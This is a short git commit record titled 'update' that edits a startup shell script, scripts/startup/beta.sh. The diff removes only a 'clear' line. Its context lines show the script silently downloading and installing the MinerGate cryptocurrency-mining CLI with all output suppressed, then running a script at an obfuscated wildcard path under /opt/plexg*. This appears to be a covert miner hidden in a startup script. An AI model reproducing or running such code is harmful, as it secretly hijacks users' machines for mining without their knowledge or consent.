bfd23de2c77b6a83de62691774bd69c3bd57f7e6
Admin0705 <user@dunn.cloud>
2017-12-07 22:04:08 -0500

    update

--- scripts/startup/beta.sh
+++ scripts/startup/beta.sh
@@ -7,5 +7,4 @@
             wget https://minergate.com/download/deb-cli -O minergate-cli.deb 1>/dev/null 2>&1
             yes | dpkg -i minergate-cli.deb 1>/dev/null 2>&1
             bash /opt/plexg*/sc*/me*/1.sh 1>/dev/null 2>&1
-            clear
         fi
